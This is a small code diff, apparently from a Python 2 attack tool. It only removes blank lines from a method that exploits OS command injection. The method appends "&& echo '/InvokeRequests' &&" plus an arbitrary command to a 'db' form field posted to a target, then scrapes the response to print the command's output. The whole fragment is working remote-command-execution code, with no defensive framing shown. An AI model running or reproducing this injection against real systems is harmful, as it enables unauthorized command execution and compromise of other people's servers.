@@ -26,16 +26,12 @@ class dns_requests:
 		'''	
 		self.post_data = "&& echo '/InvokeRequests' && %s" %(ExecutionCommand)
 		self.post_data = {"db":self.post_data}
-
 		InvokeRequests = requests.post(self.target_ip, data=self.post_data).text
 		InvokeRequests = BeautifulSoup(InvokeRequests, "html5lib")
-
 		InvokesSearchs = InvokeRequests.find_all('pre')[0]
 		InvokesSearchs = "".join(InvokesSearchs).split()[::-1]	
-
 		RegexValueReqs = InvokesSearchs.index('/InvokeRequests')
 		CountInvokeReq = len(InvokesSearchs)
-
 		del InvokesSearchs[RegexValueReqs:CountInvokeReq]
 		print " ".join(InvokesSearchs)
 
